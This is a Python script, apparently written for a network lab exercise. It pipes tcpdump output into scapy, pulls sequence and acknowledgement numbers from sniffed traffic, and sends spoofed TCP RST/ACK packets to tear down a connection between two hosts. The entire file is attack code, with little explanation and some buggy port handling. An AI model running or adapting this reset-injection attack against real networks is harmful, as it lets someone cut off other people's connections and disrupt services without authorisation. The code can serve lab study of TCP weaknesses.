#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os

from subprocess import Popen, PIPE
from scapy.all import *


SOURCE_ADDRESS = '9.0.1.2'
DESTINATION_ADDRESS = '9.0.1.1'


def log(s, col="green"):
	print T.colored(s, col)


def send_rst_packet(srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	print srcPort
	print dstPort

	srcPort = struct.pack('<h', int(srcPort))
	dstPort = struct.pack('<h', int(dstPort))

	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 1)/TCP(dport = dstPort, sport = srcPort, flags = "RA", seq = seqNum , ack = ackNum)

	sendp(spoofed_packet, iface="atk1-eth1")


def extract_address_port(value):
	values = value.split('.')

	address = values[0] + '.' + values[1] + '.' + values[2] + '.' + values[3]

	port = values[4]

	return address, port


def extract_useful_data(row):
	values = row.split(' ')

	source_address_port, destination_address_port, sequence_number, acknowledge_number = None, None, None, None

	source_address, source_port = extract_address_port(values[2])

	if source_address == SOURCE_ADDRESS:
		destination_address, destination_port = extract_address_port(values[4].replace(':', ''))

		if values[7] == 'seq':
			sequence_number = values[8].replace(',', '').split(':')[1]
			acknowledge_number = values[10].replace(',', '')
		else:
			sequence_number = values[8].replace(',', '')

		print source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number

		send_rst_packet(source_address, source_port, destination_address, destination_port, sequence_number, acknowledge_number)

	print


def main():
	# TODO 	using tcp dump retrieve absolute SN and AN for R3
	# 		then launch attack using attack_scripts/*
	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth1', '-lnS'), stdout=PIPE)

	package_num = 1

	for row in iter(p.stdout.readline, b''):
		print 'package', package_num

		extract_useful_data(row)

		package_num = package_num + 1

if __name__ == "__main__":
	main()
